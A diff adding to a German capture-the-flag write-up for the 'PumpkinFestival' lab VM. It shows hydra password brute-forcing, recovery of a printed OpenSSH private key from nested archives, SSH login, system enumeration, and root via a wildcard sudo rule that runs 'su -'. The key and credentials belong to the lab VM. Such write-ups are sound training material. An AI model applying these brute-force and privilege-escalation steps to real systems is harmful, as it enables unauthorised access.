@@ -9,6 +9,10 @@ In diesem Writeup geht es um den dritten und letzten Teil der Pumpkin-Reihe von 
 - dirb
 - wpscan
 - hydra
+- binwalk
+- tar
+- bunzip2
+- SSH
 ````
 
 ![Image](https://github.com/shendayan/CTF-ressources/blob/master/Pumpkin......)
@@ -227,15 +231,15 @@ Um diesem Fehler aus dem Weg zu gehen, habe ich nochmal nmap angeworfen und dies
 Parallel dazu lief dirbuster mit einer extrem großen Wordlist und rekursiver Suche.
 Und damit ich nichts übersehe, habe ich hydra auf den FTP-Server losgelassen, um für die Benutzer jack, morse und harry nach Zugängen zu suchen:
 
-`nmap -sC -sV -oA 192.168.178.61 -p-`
+`nmap -sC -sV -A -p- 192.168.178.61`
 
 Dirbuster lief als GUI, weil dirb mit so großen Wordlists Probleme hat.
 
 `hydra -e nsr -L users.txt -P /root/Wordlists/rockyou.txt`
 
-Definitiv Zeit eine kleine Kaffeepause einzulegen.
+Definitiv Zeit eine kleine (bis mittlere) Kaffeepause einzulegen.
 
-Wieder am Rechner wurden mit Ergebnisse präsentiert, mit denen ich nicht gerechnet hatte:
+Wieder am Rechner wurden mir Ergebnisse präsentiert, mit denen ich nicht gerechnet hatte:
 
 Dirbuster hat auf dem Server http://192.168.178.61 noch eine Datei im /tokens/-Verzeichnis gefunden:
 
@@ -245,25 +249,353 @@ Dirbuster hat auf dem Server http://192.168.178.61 noch eine Datei im /tokens/-V
 
 Token Nummer 6!
 
-- - - To be continued - - -
+hydra hat mir tatsächlich neue Zugangsdaten für den FTP-Server ausgegeben.
+
+![Image](https://github.com/shendayan/CTF-ressources/blob/master/Pumpkin......)
+
+`harry:yrrah` 
+
+## FTP die Zweite
+
+Mit den neuen Daten eingeloggt, liegt mir das nächste Token direkt vor der Nase.
+
+`get token.txt` und `cat token.txt` zeigen mir den Inhalt von Token Nummer 7:
+
+`PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e`
+
+Nachdem ich dann die Ordner `Donotopen`, `NO`, `NOO`, `NOOO` und `NOOOO` geöffnet hatte, lag dort das nächste Token:
+
+`PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c`
+
+Jetzt sind es schon 8 Tokens.
+
+Und jemand hatte wohl Freude daran eine "No"-Ordnerstruktur anzulegen. Also tiefer graben:
+
+`cd NOOOOO`, `cd NOOOOOO` & `get data.txt`
+
+`cat data.txt` zeigt eine Menge Wirrwarr an. Es ist also keine "wirkliche" Textdatei.
+
+Mit binwalk lässt sich herausfinden, was sich wirklich hinter der Datei verbirgt:
+
+````
+binwalk data.txt
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             POSIX tar archive
+````
+
+Das Archiv entpacke ich mit `tar -xf data.txt`.
+
+Die entstandene Datei `data` untersuche ich wieder mit binwalk, da auch sie für `cat` nicht lesbar ist:
+
+````
+binwalk data
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             bzip2 compressed data, block size = 900k
+````
+
+Wer solche Ordnerstrukturen, wie auf dem FTP-Server anlegt, packt auch Archive in Archive :)
+
+````
+bunzip2 data
+bunzip2: Can't guess original name for data -- using data.out
+
+binwalk data.out 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             POSIX tar archive
+
+tar -xf data.out
+tar: Ein einzelner Nullblock bei 25
+
+binwalk key 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             POSIX tar archive
+
+tar -xf key
+tar: Ein einzelner Nullblock bei 22
+````
+So, die nun entstandene Datei "jack" ist wieder eine Textdatei. Allerdings eine, die im hex-Format geschrieben ist.
+
+Wenn ich diese Datei an hex2raw pipe, habe ich das Gefühl, dass sie nicht vollständig ist.
+
+Also habe ich sie nochmal in einen [Online Hex-Decoder](https://cryptii.com/pipes/hex-decoder) eingefügt und siehe da, jetzt scheint sie komplett zu sein:
+
+````
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+16k4l9SUtcrJAAAACXJvb3RAa2FsaQE=
+-----END OPENSSH PRIVATE KEY-----
+````
+
+Ein privater SSH-Schlüssel. Bei dem Dateinamen vermutlich der von User "jack".
+
+## SSH
+
+nmap hatte mir in der Zwischenzeit den entsprechenden Port für SSH geliefert:
+
+`6880/tcp open   ssh                OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)`
+
+Also versuche ich mal eine Verbindung mit dem Schlüssel und User Jack:
+
+````
+ssh -l jack -i key.txt -p 6880 192.168.178.61
+------------------------------------------------------------------------------
+                          Welcome to Mission-Pumpkin
+      All remote connections to this machine are monitored and recorded
+------------------------------------------------------------------------------
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'jack.txt' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "jack.txt": bad permissions
+jack@192.168.178.61: Permission denied (publickey).
+````
+
+Okay, ein "private key", den jeder lesen kann ist wirklich nicht privat. 
+Dass man sich deswegen aber nicht über SSH damit verbinden kann, wusste ich nicht. Wieder was gelernt.
+
+`chmod 600 jack.txt` sollte das Problem lösen.
+
+Bingo!
+
+````
+ssh -l jack -i jack.txt -p 6880 192.168.178.61
+------------------------------------------------------------------------------
+                          Welcome to Mission-Pumpkin
+      All remote connections to this machine are monitored and recorded
+------------------------------------------------------------------------------
+
+Last login: Tue Jun 18 21:04:28 2019 from 192.168.1.105
+-bash: /home/jack/.bash_profile: Permission denied
+jack@pumpkin:~$ ls -la
+total 48
+drwx------ 5 jack jack  4096 Sep 18 22:19 .
+drwxr-xr-x 5 root root  4096 Jul 12  2019 ..
+-rw------- 1 root root     0 Sep 18 22:19 .bash_history
+-rw-r--r-- 1 jack jack   231 Jul 15  2019 .bash_logout
+-rw------- 1 root root    94 Jul 16  2019 .bash_profile
+-rw-r--r-- 1 jack jack  3675 Jul 15  2019 .bashrc
+drwx------ 2 jack jack  4096 Jul 12  2019 .cache
+-rw-r--r-- 1 jack jack   675 Jul 12  2019 .profile
+drwxrwxr-x 2 jack jack  4096 Jul 12  2019 .ssh
+-rwsr-xr-x 1 root root 11232 Jul 15  2019 token
+````
+Die Datei `token` lässt sich nicht lesen. Mit `file token` lasse ich mir anzeigen, was für eine Datei es ist.
+
+Es ist also eine ausführbare Datei. Mit `./token` führe ich sie aus und bekomme Token Nummer 9 angezeigt:
+
+````
+token: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=977c5f4023cb5e77599fd8194089aa03f155ad88, stripped
+jack@pumpkin:~$ ./token 
+ 
+PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706
+````
+
+An dieser Stelle habe ich ein wenig herumgesucht und geschaut, was ich für Informationen aus der Box bekommen kann.
+
+````
+jack@pumpkin:~$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
+goblin:x:1001:1001:Goblin,,,:/home/goblin:/bin/bash
+harry:x:1002:1002:Harry,,,:/home/harry:/bin/bash
+
+jack@pumpkin:~$ ls -la ..
+total 20
+drwxr-xr-x  5 root     root     4096 Jul 12  2019 .
+drwxr-xr-x 22 root     root     4096 Jul 12  2019 ..
+drwx------  3 harry    harry    4096 Jul 15  2019 harry
+drwx------  4 jack     jack     4096 Sep 22 12:16 jack
+drwxr-xr-x  5 www-data www-data 4096 Jul 12  2019 web
+jack@pumpkin:~$ ls -la ../web/
+total 200
+drwxr-xr-x  5 www-data www-data  4096 Jul 12  2019 .
+drwxr-xr-x  5 root     root      4096 Jul 12  2019 ..
+-rw-r--r--  1 www-data www-data    35 Jul 12  2019 .htaccess
+-rw-r--r--  1 nobody   nogroup    418 Sep 25  2013 index.php
+-rw-r--r--  1 nobody   nogroup  19988 Jul 13  2019 license.txt
+-rw-r--r--  1 nobody   nogroup    642 Jul 16  2019 readme.html
+-rw-r--r--  1 nobody   nogroup   5434 Sep 23  2017 wp-activate.php
+drwxr-xr-x  9 nobody   nogroup   4096 Feb  6  2018 wp-admin
+-rw-r--r--  1 nobody   nogroup    364 Dec 19  2015 wp-blog-header.php
+-rw-r--r--  1 nobody   nogroup   1627 Aug 29  2016 wp-comments-post.php
+-rw-rw-rw-  1 www-data www-data  3124 Jul 14  2019 wp-config.php
+-rw-r--r--  1 nobody   nogroup   2853 Dec 16  2015 wp-config-sample.php
+drwxrwxrwx  5 nobody   nogroup   4096 Sep 22 02:52 wp-content
+-rw-r--r--  1 nobody   nogroup   3669 Aug 20  2017 wp-cron.php
+drwxr-xr-x 18 nobody   nogroup  12288 Feb  6  2018 wp-includes
+-rw-r--r--  1 nobody   nogroup   2422 Nov 21  2016 wp-links-opml.php
+-rw-r--r--  1 nobody   nogroup   3306 Aug 22  2017 wp-load.php
+-rw-r--r--  1 nobody   nogroup  36583 Oct 13  2017 wp-login.php
+-rw-r--r--  1 nobody   nogroup   8048 Jan 11  2017 wp-mail.php
+-rw-r--r--  1 nobody   nogroup  16246 Oct  4  2017 wp-settings.php
+-rw-r--r--  1 nobody   nogroup  30071 Oct 18  2017 wp-signup.php
+-rw-r--r--  1 nobody   nogroup   4620 Oct 24  2017 wp-trackback.php
+-rw-r--r--  1 nobody   nogroup   3065 Aug 31  2016 xmlrpc.php
+
+jack@pumpkin:~$ cat ../web/license.txt 
+WordPress - Web publishing software
+
+Copyright 2011-2018 by the contributors
+
+PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71
 
 
+This program is free software; you can redistribute it and/or modify
+[...]
+````
 
+Nicht schlecht, das war ein sehr gut verstecktes Token Nummer 10!
 
+Da ich aus der Seite http://pumpkins.local/readme.html Jacks Passwort bekommen habe, habe ich `sudo -l` ausprobiert. Vielleicht darf er ja etwas also root ausführen.
 
+````
+Matching Defaults entries for jack on pumpkin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User jack may run the following commands on pumpkin:
+    (ALL) /home/jack/pumpkins/alohomora*
+````
 
+Weder das Verzeichnis, noch die Datei haben zu diesem Zeitpunkt existiert, ich habe also freie Hand, was ich dort erstelle.
 
+Aufgrund der fortgeschrittenen Uhrzeit und dem in der Luft liegenden Duft einer Root-Shell war ich hier recht unkreativ:
 
+````
+jack@pumpkin:~$ mkdir pumpkins
+jack@pumpkin:~$ cd pumpkins/
+jack@pumpkin:~/pumpkins$ nano alohomora
+jack@pumpkin:~/pumpkins$ cat alohomora 
+#!/bin/sh
+echo "Alohomora!"
+su -
+jack@pumpkin:~/pumpkins$ chmod +x alohomora\* 
+jack@pumpkin:~/pumpkins$ sudo ./alohomora 
+Alohomora!
+root@pumpkin:~# 
+````
 
+## Root-Shell :)
 
+Sich das Ticket zu sichern war jetzt ein Kinderspiel.
 
+Interessant finde ich, dass ich am Ende nicht eins der Token gebraucht habe. Aber sehr zufriedenstellend, dass ich alle gefunden habe!
 
+````
+root@pumpkin:~# cd /root/
+root@pumpkin:~# ls -la
+total 36
+drwx------  3 root root 4096 Jul 16  2019 .
+drwxr-xr-x 22 root root 4096 Jul 12  2019 ..
+-rw-r--r--  1 root root   55 Jul 15  2019 .bash_logout
+-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
+drwx------  2 root root 4096 Jul 12  2019 .cache
+-rw-------  1 root root  369 Jul 13  2019 .mysql_history
+-rw-------  1 root root   89 Jul 16  2019 .nano_history
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-r--r--  1 root root 1688 Jul 15  2019 PumpkinFestival_Ticket
+root@pumpkin:~# cat PumpkinFestival_Ticket 
+------------------------------------------------------------
+                        Yippeeeee!
+  Congratulations on successfully rooting this machine.
 
+                          ooo
+                         $ o$
+                        o $$
+              ""$$$    o" $$ oo "
+          " o$"$oo$$$"o$$o$$"$$$$$ o
+         $" "o$$$$$$o$$$$$$$$$$$$$$o     o
+      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o
+     " "     o  "$$$o   o$$$$$$$$$$$oo$$
+    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o
+  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "
+ o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $
+ $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o
+o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o
+"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "
+"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o
+$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "
+$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o
+ o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o
+ "  " o  o$o" $$$$o   ""           o  o$$$$$"   o
+  $         o$$$$$$$oo            "oo$$$$$$$"    o
+  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o
+    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"
+     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"
+        "" $$$$$$$$$$$$$$$$$$$$$$" """"
+                         """"""
+      There were 10 PumpkinTokens on this VM
 
+------------------------------------------------------------
+    Love to know your thoughts and suggestions
+              Tweet me @askjayanth
+------------------------------------------------------------
+     
+  Eagerly waiting to see your detailed walk-throughs
+            Level 1 : PumpkinGarden
+            Level 2 : PumpkinRaising
+            Level 3 : PumpkinFestival
 
+  Until next time, Mission-Pumpkin v1.0 signing off...
+````
 
+Die Serie hat mir sehr gefallen und war an einigen Stellen schön knifflig! 
+Kann uneingeschränkt weiterempfohlen werden! :)
 
+Danke für's Lesen und happy pwning!
 
-
-
+Kontakt -> [Twitter](https://twitter.com/_the_someone)
